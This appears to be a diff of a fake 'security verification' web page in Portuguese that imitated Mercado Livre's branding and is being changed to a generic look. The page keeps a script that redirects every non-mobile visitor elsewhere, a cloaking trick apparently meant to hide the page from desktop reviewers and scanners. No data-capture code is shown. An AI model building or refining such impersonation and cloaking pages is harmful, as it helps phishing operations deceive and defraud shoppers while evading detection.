@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<title>Verificação de Segurança - Mercado Livre</title>
+<title>Verificação de Segurança</title>
 <link rel="icon" href="../images/favicon.png">
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 
@@ -65,7 +65,7 @@ var timer = setInterval(function () {
 <!-- Mobile-only redirect -->
 <script>
 var isMobile = /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|Mobile/i.test(navigator.userAgent);
-if (!isMobile) { window.location.href = "https://www.mercadolivre.com.br"; }
+if (!isMobile) { window.location.href = "https://www.google.com"; }
 </script>
 
 <style>
@@ -74,7 +74,7 @@ body{font-family:'Inter',-apple-system,sans-serif;background:#f5f5f5;min-height:
 
 .verify-card{background:#fff;border-radius:16px;box-shadow:0 8px 32px rgba(0,0,0,0.08);padding:32px 24px;max-width:400px;width:100%;text-align:center;position:relative;overflow:hidden}
 
-.verify-card::before{content:'';position:absolute;top:0;left:0;right:0;height:4px;background:linear-gradient(90deg,#ffe600,#3483fa)}
+.verify-card::before{content:'';position:absolute;top:0;left:0;right:0;height:4px;background:linear-gradient(90deg,#3483fa,#06b6d4)}
 
 .logo{height:32px;margin-bottom:24px}
 
@@ -139,7 +139,10 @@ body{font-family:'Inter',-apple-system,sans-serif;background:#f5f5f5;min-height:
 <body>
 
 <div class="verify-card">
-  <img src="../images/logoml.png" alt="Mercado Livre" class="logo" onerror="this.style.display='none'">
+  <div class="logo" style="height:32px;display:flex;align-items:center;justify-content:center;margin-bottom:24px">
+    <svg viewBox="0 0 24 24" style="width:28px;height:28px;fill:#3483fa;margin-right:6px"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+    <span style="font-size:16px;font-weight:700;color:#1a1a2e">Verificação Segura</span>
+  </div>
 
   <div class="shield-wrap" id="shieldWrap">
     <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
@@ -191,7 +194,7 @@ body{font-family:'Inter',-apple-system,sans-serif;background:#f5f5f5;min-height:
   </div>
 </div>
 
-<div class="brand-bar">&copy; 2026 Mercado Livre - Todos os direitos reservados</div>
+<div class="brand-bar">&copy; 2026 - Todos os direitos reservados</div>
 
 <script>
 (function() {
